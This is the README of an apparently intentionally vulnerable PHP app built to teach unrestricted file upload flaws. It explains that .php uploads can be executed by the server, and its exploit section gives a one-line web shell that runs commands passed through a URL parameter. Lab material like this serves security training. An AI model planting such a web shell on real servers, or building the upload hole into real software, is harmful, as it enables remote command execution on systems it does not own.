# php-file-upload

A simple PHP app vulnerable to unrestricted file uploads.

## Vulnerability

The app allows uploading of any file type, including `.php`, which could be executed by the server.

## How to Exploit

Try uploading a malicious `.php` file, e.g.:

```php
<?php system($_GET['cmd']); ?>
